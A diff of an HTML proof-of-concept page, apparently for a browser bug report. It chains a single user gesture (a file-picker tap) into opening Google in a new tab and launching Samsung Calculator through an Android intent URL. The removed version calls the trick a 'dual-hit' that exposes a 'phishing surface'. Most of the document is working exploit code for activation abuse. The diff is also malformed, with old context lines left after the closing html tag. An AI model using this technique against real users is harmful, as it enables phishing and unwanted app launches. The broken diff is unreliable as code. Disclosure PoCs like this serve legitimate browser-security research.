@@ -1,68 +1,33 @@
-<!doctype html>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Relay PoC — new tab + app launch</title>
-<style>
-  body{font-family:Arial,Helvetica,sans-serif;background:#f7f8fb;margin:0;height:100%;display:flex;align-items:center;justify-content:center}
-  .card{padding:20px;border-radius:12px;background:#fff;box-shadow:0 6px 18px rgba(0,0,0,0.06);max-width:520px;text-align:center}
-  button{padding:12px 18px;border-radius:8px;background:#0b63d6;color:#fff;border:0;font-size:16px;cursor:pointer}
-  p{color:#444}
-</style>
-
-<div class="card">
-  <h2>Pick a file (demo)</h2>
-  <p>Tap to open system picker. After selecting a file this PoC will open Google in a new tab and attempt to launch Samsung Calculator.</p>
-  <button id="go">Pick file & run dual-hit</button>
-</div>
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>File Picker → Google + Calculator</title>
+</head>
+<body>
+<h1>Tap anywhere to start</h1>
 
 <script>
-const btn = document.getElementById('go');
-
-// Relay HTML (data: URL) — opens Google in a new tab then launches calculator intent.
-const relayHtml = `
-<!doctype html>
-<html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head>
-<body>
-  <script>
-    // Immediately run actions (popup has user activation since it was opened by a user gesture)
+document.body.onclick = async () => {
     try {
-      // 1) Open Google in a new tab (makes the phishing surface visible)
-      window.open('https://www.google.com', '_blank');
+        // Trigger file picker
+        const [fileHandle] = await showOpenFilePicker();
 
-      // 2) After a short delay, attempt to launch Samsung Calculator via intent
-      // (replace package with another installed package if needed)
-      setTimeout(() => {
-        // Using window.location.href to trigger an intent handler in the current popup.
-        // We use '#Intent;...;end' form which most Chromium-based browsers interpret.
-        location.href = 'intent://#Intent;action=android.intent.action.MAIN;package=com.sec.android.app.popupcalculator;end';
-      }, 200);
-    } catch (e) {
-      // if anything fails, show an error for triage
-      console.error('relay error', e);
-      document.body.innerText = 'Relay had an error: ' + (e && e.message ? e.message : e);
+        // Open Google in a new tab
+        window.open("https://www.google.com", "_blank");
+
+        // Short delay so both actions trigger from the same activation
+        setTimeout(() => {
+            // Try opening Samsung Calculator via intent
+            location.href = "intent://com.sec.android.app.popupcalculator#Intent;scheme=android-app;end";
+        }, 200);
+    } catch (err) {
+        console.error(err);
     }
-  <\/script>
-</body></html>
-`;
-
-// Create data URL
-const relayDataUrl = 'data:text/html;base64,' + btoa(relayHtml);
-
-async function start() {
-  try {
-    // Open file picker to get the user activation
-    if (window.showOpenFilePicker) {
-      await showOpenFilePicker({ multiple: false });
-    } else {
-      // fallback: create & click an input
-      const input = document.createElement('input');
-      input.type = 'file';
-      input.accept = '*/*';
-      input.style.display = 'none';
-      document.body.appendChild(input);
-      input.click();
-      await new Promise((resolve) => {
-        input.addEventListener('change', () => resolve(), {once:true});
-        // optional timeout: resolve anyway after 12s
+};
+</script>
+</body>
+</html>
         setTimeout(resolve, 12000);
       });
       input.remove();
